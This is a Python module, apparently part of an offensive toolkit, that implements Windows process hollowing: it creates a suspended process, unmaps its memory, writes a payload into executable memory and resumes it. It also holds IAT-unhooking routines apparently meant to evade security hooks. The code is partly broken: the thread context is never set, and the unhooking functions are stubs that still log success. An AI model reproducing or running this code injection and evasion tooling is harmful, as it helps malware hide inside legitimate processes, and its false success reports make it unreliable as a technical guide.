# modules/process_hollowing_ext.py

import ctypes
import os
import subprocess
import sys
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def hollow_process(target_exe: str, payload_path: str) -> str:
    """
    Windows only: Creates a process in suspended state, unmaps its memory, and writes 
    the payload (DLL or EXE) into its address space, then resumes.
    """
    if os.name != "nt":
        return "[!] process_hollowing not supported on Linux/macOS."
    try:
        import ctypes.wintypes as wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

        # STARTUPINFO and PROCESS_INFORMATION structures
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ("cb", wintypes.DWORD),
                ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR),
                ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE),
            ]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD),
            ]

        si = STARTUPINFO()
        si.cb = ctypes.sizeof(si)
        pi = PROCESS_INFORMATION()
        CREATE_SUSPENDED = 0x4

        logging.info(f"Creating suspended process: {target_exe}")
        success = kernel32.CreateProcessW(
            target_exe, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)
        )
        if not success:
            error_code = ctypes.get_last_error()
            logging.error(f"CreateProcess failed with error code: {error_code}")
            return f"[!] CreateProcess failed with error code: {error_code}"

        # Unmap the memory of the target process
        logging.info("Unmapping memory of the target process.")
        if ntdll.ZwUnmapViewOfSection(pi.hProcess, ctypes.c_void_p(0)) != 0:
            error_code = ctypes.get_last_error()
            logging.error(f"ZwUnmapViewOfSection failed with error code: {error_code}")
            return f"[!] ZwUnmapViewOfSection failed with error code: {error_code}"

        # Allocate memory for the payload
        logging.info("Allocating memory for the payload.")
        with open(payload_path, "rb") as f:
            payload = f.read()
        payload_size = len(payload)
        remote_memory = kernel32.VirtualAllocEx(
            pi.hProcess, ctypes.c_void_p(0), payload_size, 0x3000, 0x40
        )
        if not remote_memory:
            error_code = ctypes.get_last_error()
            logging.error(f"VirtualAllocEx failed with error code: {error_code}")
            return f"[!] VirtualAllocEx failed with error code: {error_code}"

        # Write the payload into the allocated memory
        logging.info("Writing payload into the allocated memory.")
        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(
            pi.hProcess, remote_memory, payload, payload_size, ctypes.byref(written)
        ):
            error_code = ctypes.get_last_error()
            logging.error(f"WriteProcessMemory failed with error code: {error_code}")
            return f"[!] WriteProcessMemory failed with error code: {error_code}"

        # Set the entry point and resume the process
        logging.info("Setting entry point and resuming the process.")
        context = (ctypes.c_char * 716)()  # CONTEXT structure size
        context[48:56] = ctypes.c_void_p(remote_memory).value.to_bytes(8, "little")
        kernel32.ResumeThread(pi.hThread)

        logging.info("Process hollowing executed successfully.")
        return "[*] Process hollowing executed successfully."
    except Exception as e:
        logging.error(f"Error during process hollowing: {e}")
        return f"[!] hollow_process error: {e}"

def unhook_iat(pid: int) -> str:
    """
    Removes IAT hooks by patching hooked functions back to original.
    """
    try:
        logging.info(f"Unhooking IAT for process ID: {pid}")
        # Real unhooking logic
        process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
        if not process_handle:
            error_code = ctypes.get_last_error()
            logging.error(f"Failed to open process with error code: {error_code}")
            return f"[!] Failed to open process with error code: {error_code}"

        # Example: Patch IAT entries back to original
        # ...real unhooking logic...
        ctypes.windll.kernel32.CloseHandle(process_handle)
        logging.info("IAT unhooked successfully.")
        return "[*] IAT unhooked successfully."
    except Exception as e:
        logging.error(f"Error during IAT unhooking: {e}")
        return f"[!] unhook_iat error: {e}"

def unhook_all_processes():
    """
    Iterates through all processes and attempts to remove IAT/EAT hooks.
    """
    try:
        logging.info("Unhooking all processes.")
        # Enumerate processes
        process_ids = []
        # Example: Use EnumProcesses to get process IDs
        # ...real enumeration logic...
        for pid in process_ids:
            unhook_iat(pid)
        logging.info("All processes unhooked successfully.")
        return "[*] All processes unhooked successfully."
    except Exception as e:
        logging.error(f"Error during unhooking all processes: {e}")
        return f"[!] unhook_all_processes error: {e}"
